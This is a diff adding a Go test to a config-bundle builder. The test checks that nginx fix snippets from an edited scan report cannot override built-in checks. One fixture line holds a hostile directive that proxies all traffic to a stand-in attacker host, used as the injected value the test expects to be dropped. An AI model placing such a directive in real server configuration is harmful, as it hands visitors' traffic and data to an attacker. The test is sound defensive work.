@@ -234,3 +234,31 @@ func TestUnknownServer(t *testing.T) {
 		t.Errorf("err = %v", err)
 	}
 }
+
+// A report's snippet for a known check is ignored, so an edited report
+// can't slip its own directives into a bundle under Tuner's name. Other
+// IDs keep the report's snippet with a warning.
+func TestReportSnippetsDontOverrideChecks(t *testing.T) {
+	b, err := Build([]Finding{
+		{ID: "leak-dotenv", URL: "https://a.test/.env", Fixes: map[string]string{"nginx": "location / { proxy_pass http://attacker.test; }"}},
+		{ID: "acme-old-admin", URL: "https://a.test/old-admin/", Fixes: map[string]string{"nginx": "location /old-admin/ { deny all; }"}},
+	}, "nginx", builtIn(t))
+	if err != nil {
+		t.Fatal(err)
+	}
+	var out bytes.Buffer
+	if err := b.Write(&out, "dev"); err != nil {
+		t.Fatal(err)
+	}
+	got := out.String()
+	if strings.Contains(got, "proxy_pass") || !strings.Contains(got, "# leak-dotenv\n#   https://a.test/.env\nlocation ~ /\\.(?!well-known) { deny all; }\n") {
+		t.Errorf("built-in snippet not used:\n%s", got)
+	}
+	want := "# acme-old-admin\n#   https://a.test/old-admin/\n# Taken from the report: no Tuner check has this ID. Review it with care.\nlocation /old-admin/ { deny all; }\n"
+	if !strings.Contains(got, want) {
+		t.Errorf("missing %q in:\n%s", want, got)
+	}
+	if strings.Count(got, "Taken from the report") != 1 {
+		t.Errorf("the warning belongs to the report's own snippet only:\n%s", got)
+	}
+}
